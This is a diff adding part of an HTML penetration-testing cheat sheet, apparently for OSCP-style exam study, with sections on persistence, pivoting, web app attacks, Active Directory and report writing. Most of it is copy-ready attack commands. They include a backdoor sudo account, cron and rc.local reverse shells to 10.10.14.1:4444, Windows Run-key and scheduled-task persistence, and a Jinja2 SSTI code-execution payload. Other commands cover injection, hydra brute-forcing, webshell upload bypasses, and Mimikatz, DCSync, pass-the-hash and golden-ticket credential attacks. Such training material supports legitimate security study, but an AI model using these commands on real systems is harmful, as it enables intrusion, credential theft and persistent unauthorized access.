+<span class="c"># Method 2: Add user</span>
+useradd <span class="v">-M -s /bin/bash</span> backdoor
+echo <span class="s">"backdoor:password123"</span> | chpasswd
+usermod <span class="v">-aG sudo</span> backdoor
+
+<span class="c"># Method 3: Cron reverse shell</span>
+(crontab <span class="v">-l</span> 2/dev/null; echo <span class="s">"* * * * * bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"</span>) | crontab -
+
+<span class="c"># Method 4: /etc/rc.local (root)</span>
+echo <span class="s">"bash -i >& /dev/tcp/10.10.14.1/4444 0>&1 &"</span> >> /etc/rc.local
+
+<span class="c"># ── WINDOWS PERSISTENCE ───────────────────────────</span>
+<span class="c"># Registry Run key</span>
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Users\user\shell.exe"
+
+<span class="c"># Scheduled task</span>
+schtasks /create /tn "Updater" /tr "C:\shell.exe" /sc onlogon /ru SYSTEM
+
+<span class="c"># Meterpreter persistence module</span>
+run persistence <span class="v">-X -i 30 -p 4444 -r 10.10.14.1</span></pre>
+      </div>
+    </div>
+    <div>
+      <h3 style="font-family:var(--stencil);font-size:14px;letter-spacing:.1em;color:var(--amber);text-transform:uppercase;margin-bottom:12px">Pivoting / Tunneling</h3>
+      <div class="code">
+        <div class="code-bar"><div class="cb-l"><span class="code-title">network pivoting</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+        <pre><span class="c"># Scenario: You own 10.10.10.5 (DMZ)
+# Internal network: 192.168.1.0/24 not reachable from you
+# Goal: Attack 192.168.1.x through pivot host</span>
+
+<span class="c"># ── SSH TUNNELING ─────────────────────────────────</span>
+<span class="c"># Local port forward:</span>
+<span class="c"># Forward local 8080 → target's 192.168.1.20:80</span>
+ssh <span class="v">-L 8080:192.168.1.20:80</span> user@10.10.10.5
+<span class="c"># Now: curl http://localhost:8080 → hits internal server</span>
+
+<span class="c"># Dynamic SOCKS proxy (proxychains) — most flexible</span>
+ssh <span class="v">-D 9050</span> user@10.10.10.5  <span class="c"># pivot = SOCKS5 proxy</span>
+<span class="c"># /etc/proxychains.conf: socks5 127.0.0.1 9050</span>
+proxychains nmap <span class="v">-sT</span> 192.168.1.0/24  <span class="c"># scan internal net!</span>
+proxychains curl http://192.168.1.20/
+
+<span class="c"># ── CHISEL (when SSH not available) ───────────────</span>
+<span class="c"># Attacker (server):</span>
+./chisel server <span class="v">--port 8888 --reverse</span>
+<span class="c"># Target (client) — creates SOCKS tunnel:</span>
+./chisel client 10.10.14.1:8888 <span class="v">R:socks</span>
+
+<span class="c"># ── METASPLOIT ROUTE ──────────────────────────────</span>
+<span class="c"># After getting meterpreter on pivot host:</span>
+run post/multi/manage/autoroute
+<span class="c"># OR:</span>
+route add 192.168.1.0/24 <session_id>
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S8 · WEB APP TESTING
+══════════════════════════════════════════════════ -->
+<section class="section" id="s8">
+  <div class="sec-kicker"><div class="sec-num">08</div><div class="sec-tag">Specialized</div></div>
+  <div class="sec-title">Web Application Testing</div>
+  <p class="sec-brief">Systematic methodology for attacking web applications — from recon through exploitation of OWASP Top 10 vulnerabilities.</p>
+
+  <div class="code">
+    <div class="code-bar"><div class="cb-l"><span class="code-title">web app testing workflow</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+    <pre><span class="c"># ── STEP 1: RECON ──────────────────────────────────────────────────────</span>
+whatweb https://target.com                           <span class="c"># tech stack</span>
+gobuster dir <span class="v">-u</span> https://target.com <span class="v">-w</span> raft-large-directories.txt <span class="v">-x php,html,txt,bak</span>
+gobuster dns <span class="v">-d</span> target.com <span class="v">-w</span> subdomains-top1million-5000.txt
+waybackurls target.com | sort <span class="v">-u</span>               <span class="c"># old endpoints</span>
+curl <span class="v">-sI</span> https://target.com                      <span class="c"># response headers</span>
+
+<span class="c"># ── STEP 2: PARAMETER DISCOVERY ────────────────────────────────────────</span>
+<span class="c"># With Burp Suite: Spider + Smart Scan</span>
+arjun <span class="v">-u</span> https://target.com/api/data             <span class="c"># parameter bruteforce</span>
+paramspider <span class="v">-d</span> target.com                        <span class="c"># URL params from Wayback</span>
+
+<span class="c"># ── STEP 3: INJECTION TESTING ──────────────────────────────────────────</span>
+<span class="c"># SQLi — manual test every parameter:</span>
+curl "https://target.com/item?id=1'"              <span class="c"># error = SQLi?</span>
+sqlmap <span class="v">-u</span> "https://target.com/item?id=1" <span class="v">--dbs</span>  <span class="c"># automated SQLi</span>
+
+<span class="c"># XSS — test every input/output point:</span>
+<span class="c"># In Burp Repeater, inject: &lt;svg onload=alert(1)&gt;</span>
+
+<span class="c"># SSTI (Server-Side Template Injection):</span>
+<span class="c"># Test: {{7*7}} → if returns 49, SSTI exists!</span>
+<span class="c"># Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}</span>
+
+<span class="c"># Command injection:</span>
+curl "https://target.com/ping?host=8.8.8.8;id"   <span class="c"># ; command chaining</span>
+curl "https://target.com/ping?host=8.8.8.8|id"   <span class="c"># | piping</span>
+curl "https://target.com/ping?host=8.8.8.8%0Aid" <span class="c"># %0A newline</span>
+
+<span class="c"># ── STEP 4: AUTH TESTING ────────────────────────────────────────────────</span>
+<span class="c"># Brute force login</span>
+hydra <span class="v">-l admin -P</span> /usr/share/wordlists/rockyou.txt target.com http-post-form \
+  <span class="s">"/login:username=^USER^&password=^PASS^:F=Invalid credentials"</span>
+
+<span class="c"># ── STEP 5: FILE UPLOAD BYPASS ──────────────────────────────────────────</span>
+<span class="c"># Test: upload PHP webshell with various bypasses</span>
+<span class="c"># Extensions: .php .php5 .phtml .pHp .PHP .php.jpg</span>
+<span class="c"># Content-Type: change to image/jpeg</span>
+<span class="c"># Add image header bytes: GIF89a; at start of PHP file</span></pre>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S9 · ACTIVE DIRECTORY
+══════════════════════════════════════════════════ -->
+<section class="section" id="s9">
+  <div class="sec-kicker"><div class="sec-num">09</div><div class="sec-tag">Enterprise Hacking</div></div>
+  <div class="sec-title">Active Directory Attacks</div>
+  <p class="sec-brief">The crown jewel of enterprise penetration testing. AD environments are present in 90%+ of enterprise targets. Owning AD = owning everything.</p>
+
+  <div class="note na">
+    <div class="note-lbl">AD Attack Path</div>
+    Foothold → Local Admin → Credential Harvesting → Lateral Movement → Domain Admin → Forest Compromise. <strong>Tools:</strong> BloodHound (graph attack paths), CrackMapExec (exec at scale), Impacket (protocol attacks), Mimikatz (credential extraction).
+  </div>
+
+  <div class="code">
+    <div class="code-bar"><div class="cb-l"><span class="code-title">Active Directory attacks — complete toolkit</span></div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash/ps</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+    <pre><span class="c"># ── ENUMERATION ──────────────────────────────────────────────────</span>
+<span class="c"># With credentials:</span>
+crackmapexec smb 192.168.1.0/24 <span class="v">-u</span> user <span class="v">-p</span> pass             <span class="c"># check access</span>
+crackmapexec smb 192.168.1.0/24 <span class="v">-u</span> user <span class="v">-p</span> pass <span class="v">--shares</span>    <span class="c"># list shares</span>
+crackmapexec smb 192.168.1.0/24 <span class="v">-u</span> user <span class="v">-p</span> pass <span class="v">--users</span>     <span class="c"># enum users</span>
+crackmapexec smb 192.168.1.0/24 <span class="v">-u</span> user <span class="v">-p</span> pass <span class="v">--pass-pol</span>  <span class="c"># password policy</span>
+
+<span class="c"># BloodHound data collection:</span>
+python3 bloodhound-python <span class="v">-d</span> corp.local <span class="v">-u</span> user <span class="v">-p</span> pass <span class="v">-ns</span> DC_IP <span class="v">-c all</span>
+<span class="c"># Import JSON files into BloodHound GUI → find attack paths</span>
+<span class="c"># Query: Shortest Path to Domain Admin</span>
+
+<span class="c"># ── KERBEROASTING ─────────────────────────────────────────────────</span>
+<span class="c"># Extract service account ticket hashes → crack offline</span>
+impacket-GetUserSPNs corp.local/user:pass <span class="v">-dc-ip</span> 192.168.1.10 <span class="v">-request</span>
+hashcat <span class="v">-a 0 -m 13100</span> kerberoast.txt /usr/share/wordlists/rockyou.txt
+
+<span class="c"># ── AS-REP ROASTING ────────────────────────────────────────────────</span>
+<span class="c"># Accounts without pre-auth required → get hash without creds</span>
+impacket-GetNPUsers corp.local/ <span class="v">-no-pass -usersfile</span> users.txt <span class="v">-dc-ip</span> 192.168.1.10
+hashcat <span class="v">-a 0 -m 18200</span> asrep.txt rockyou.txt
+
+<span class="c"># ── PASS THE HASH ──────────────────────────────────────────────────</span>
+<span class="c"># Use NTLM hash instead of cleartext password</span>
+crackmapexec smb 192.168.1.0/24 <span class="v">-u</span> Administrator <span class="v">-H</span> NTLM_HASH
+impacket-psexec corp.local/Administrator@192.168.1.10 <span class="v">-hashes</span> :NTLM_HASH
+
+<span class="c"># ── MIMIKATZ (on Windows) ─────────────────────────────────────────</span>
+.\mimikatz.exe
+privilege::debug                         <span class="c"># enable debug privilege</span>
+sekurlsa::logonpasswords                 <span class="c"># dump plaintext passwords!</span>
+sekurlsa::tickets /export                <span class="c"># export Kerberos tickets</span>
+lsadump::sam                             <span class="c"># dump SAM database</span>
+lsadump::dcsync /user:Administrator      <span class="c"># DCSync attack!</span>
+
+<span class="c"># ── DCSYNC (Domain Controller Sync → dump ALL hashes) ─────────────</span>
+<span class="c"># Requires: Domain Admin or Replication rights</span>
+impacket-secretsdump corp.local/Admin:pass@192.168.1.10 <span class="v">-just-dc</span>
+<span class="c"># Golden Ticket → lifetime domain persistence:</span>
+impacket-ticketer <span class="v">-nthash</span> KRBTGT_HASH <span class="v">-domain-sid</span> DOMAIN_SID <span class="v">-domain</span> corp.local Administrator</pre>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S10 · REPORTING
+══════════════════════════════════════════════════ -->
+<section class="section" id="s10">
+  <div class="sec-kicker"><div class="sec-num">10</div><div class="sec-tag">Deliverable</div></div>
+  <div class="sec-title">Reporting & Quick Reference</div>
+  <p class="sec-brief">A pentest is only valuable if the findings are communicated clearly. Professional reports separate ethical hackers from script kiddies.</p>
+
+  <div class="g2">
+    <div class="mini">
+      <h4>Report Structure</h4>
+      <ol style="padding-left:16px;margin-top:8px">
+        <li><strong>Executive Summary</strong> — C-suite language, business risk, top findings</li>
+        <li><strong>Scope & Methodology</strong> — what was tested, how, when</li>
+        <li><strong>Attack Narrative</strong> — story of the attack chain</li>
+        <li><strong>Findings</strong> — each vuln with evidence, CVSS score, remediation</li>
+        <li><strong>Remediation Roadmap</strong> — prioritized fix list</li>
+        <li><strong>Appendices</strong> — raw scan output, tool commands</li>
+      </ol>
+    </div>
+    <div class="mini">
+      <h4>CVSS Severity Ratings</h4>
+      <table class="dt" style="margin-top:8px">
+        <tr><th>Score</th><th>Severity</th><th>Action</th></tr>
+        <tr><td class="mc" style="color:#e05050">9.0–10.0</td><td>Critical</td><td>Fix immediately</td></tr>
+        <tr><td class="mc" style="color:#e08040">7.0–8.9</td><td>High</td><td>Fix within 30 days</td></tr>
+        <tr><td class="mc" style="color:var(--amber)">4.0–6.9</td><td>Medium</td><td>Fix within 90 days</td></tr>
+        <tr><td class="mc" style="color:#8ec97a">0.1–3.9</td><td>Low</td><td>Fix at next cycle</td></tr>
+        <tr><td class="mc" style="color:var(--muted)">0.0</td><td>Informational</td><td>Awareness only</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="sec-divider"><span>QUICK REFERENCE</span></div>
+
+  <div class="g3">
+    <div class="mini">
+      <h4>Essential One-Liners</h4>
+      <div class="code" style="margin-top:8px">
+        <div class="code-bar"><div class="code-title">quick commands</div><div class="cb-right" style="display:flex;gap:6px"><span class="code-lang">bash</span></div></div>
+        <pre style="font-size:10.5px">sudo <span class="v">-l</span>              <span class="c"># privesc check</span>
+find / <span class="v">-perm -u=s 2</span>/dev/null  <span class="c"># SUID</span>
+ss <span class="v">-tulpn</span>            <span class="c"># open ports</span>
+cat /etc/crontab      <span class="c"># cron jobs</span>
+getcap <span class="v">-r /</span> 2/dev/null  <span class="c"># capabilities</span>
+env | grep <span class="v">-i</span> pass    <span class="c"># env vars</span>
+cat ~/.bash_history    <span class="c"># cmd history</span>
+ip route show          <span class="c"># routing</span></pre>
+      </div>
+    </div>
+    <div class="mini">
+      <h4>Common Exploits / CVEs</h4>
+      <table class="dt" style="margin-top:8px">
+        <tr><th>CVE</th><th>Name</th></tr>
+        <tr><td class="mc">MS17-010</td><td>EternalBlue (SMBv1)</td></tr>
+        <tr><td class="mc">CVE-2021-4034</td><td>PwnKit (Polkit)</td></tr>
+        <tr><td class="mc">CVE-2021-3560</td><td>Polkit Priv Esc</td></tr>
+        <tr><td class="mc">CVE-2022-0847</td><td>DirtyPipe (Linux)</td></tr>
+        <tr><td class="mc">CVE-2021-44228</td><td>Log4Shell</td></tr>
+        <tr><td class="mc">CVE-2019-0708</td><td>BlueKeep (RDP)</td></tr>
+      </table>
+    </div>
+    <div class="mini">
+      <h4>OSCP Exam Tips</h4>
+      <ul style="padding-left:16px;margin-top:8px">
+        <li>Always do full port scan (-p-)</li>
+        <li>Enumerate every service deeply</li>
+        <li>Try manual before automated</li>
+        <li>Always check for local.txt + proof.txt</li>
+        <li>Take screenshots of every flag</li>
+        <li>Document every command you run</li>
+        <li>Focus: try harder, not run harder</li>
+        <li>Take breaks — fresh eyes spot things</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Checklist -->
+  <div style="margin-top:32px;background:var(--olive2);border:1px solid var(--border2);padding:28px 32px;position:relative">
+    <div style="position:absolute;top:-1px;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--amber),transparent)"></div>
+    <div style="font-family:var(--stencil);font-size:11px;letter-spacing:.28em;color:var(--amber);text-transform:uppercase;margin-bottom:18px">// OSCP / PNPT / eJPT — READINESS CHECKLIST</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+      <div style="font-family:var(--body);font-size:13px;color:var(--khaki);line-height:2.1">
+        ☐ Perform full Nmap scan with -sV -sC -O<br>
+        ☐ Enumerate SMB with enum4linux + CrackMapExec<br>
+        ☐ Get a Meterpreter shell via EternalBlue<br>
+        ☐ Manually upgrade netcat shell to full TTY<br>
+        ☐ Run LinPEAS and manually verify findings<br>
+        ☐ Exploit SUID binary to get root shell
+      </div>
+      <div style="font-family:var(--body);font-size:13px;color:var(--khaki);line-height:2.1">
+        ☐ Set up SOCKS proxy and pivot via proxychains<br>
+        ☐ Kerberoast a service account + crack hash<br>
+        ☐ Pass-the-Hash with CrackMapExec<br>
+        ☐ Write a professional finding report with CVSS<br>
+        ☐ Transfer files using 3 different methods<br>
+        ☐ Establish persistence via SSH key + cron
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<script>
+// Navigation
+function goTo(id, el) {
+  document.getElementById(id)?.scrollIntoView({behavior:'smooth', block:'start'});
+  if(el) {
+    document.querySelectorAll('.sb-item').forEach(i => i.classList.remove('active'));
+    el.classList.add('active');
+  }
+}
+
+// Card toggle
+function tog(id) { document.getElementById(id)?.classList.toggle('open'); }
+
+// Active section tracking
+const secs = document.querySelectorAll('section[id]');
+const items = document.querySelectorAll('.sb-item');
+secs.forEach(s => {
+  new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if(e.isIntersecting) {
+        const i = [...secs].indexOf(e.target);
+        items.forEach(it => it.classList.remove('active'));
+        if(items[i]) items[i].classList.add('active');
+      }
+    });
+  }, {threshold: 0.2}).observe(s);
+});
+
+// Copy buttons
+function cp(btn) {
+  const pre = btn.closest('.code')?.querySelector('pre');
+  if(!pre) return;
+  navigator.clipboard.writeText(pre.textContent.trim()).then(() => {
+    const o = btn.textContent;
+    btn.textContent = 'copied!'; btn.style.color = '#8ec97a';
+    setTimeout(() => { btn.textContent = o; btn.style.color = ''; }, 2000);
+  });
+}
+</script>
+</body>
+</html>
